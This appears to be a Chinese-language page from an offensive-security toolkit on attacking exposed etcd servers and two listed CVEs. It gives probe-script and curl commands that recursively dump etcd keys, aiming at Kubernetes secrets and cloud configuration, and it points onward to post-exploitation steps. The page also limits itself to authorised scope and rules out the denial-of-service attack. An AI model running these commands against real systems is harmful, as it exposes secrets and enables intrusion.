# etcd 未鉴权与 Watch 越权手法（CVE-2026-73499 / 73500）

> Skill：`杀招/契柜无门`  
> 探针：`炼蛊房/etcd_probe.py`  
> 指纹：`tools/1day-kit/custom-templates/etcd-unauth-surface.yaml`  
> 总览：`CVE日报-2026-08-13.md` §5  
> 红线：仅 scope 内网/主机；**默认不做 73500 TLS DoS**

---

## 0. 画像

| CVE | 面 | 本库默认 |
|-----|-----|----------|
| **CVE-2026-73499** | Watch 越权读 | 授权内可验证读 |
| **CVE-2026-73500** | TLS 握手耗尽 DoS | 只记情报，不做破坏 |

常见端口 **2379**。未鉴权 etcd → K8s secret / 业务配置 / 云控配置。

---

## 1. 命令

```bash
python3 炼蛊房/etcd_probe.py -u http://IP:2379 --case <案卷>
python3 炼蛊房/etcd_probe.py -u http://IP:2379 --case <案卷> --deep

curl -sk http://IP:2379/version
curl -sk 'http://IP:2379/v2/keys/?recursive=true' | head -c 2000
```

---

## 2. 成功口径

| 级别 | 口径 |
|------|------|
| L1 | `/version` 返回 etcdserver |
| L2 | 可读 keys / 敏感配置片段落证据 |
| 后续 | 切 `群瓮·特权.md` / `linux-post-exploit` / 回灌 `tg-cloud-panel` |

---

## 3. 不要做

- 对生产做握手洪水 DoS  
- 未授权扫公网 2379
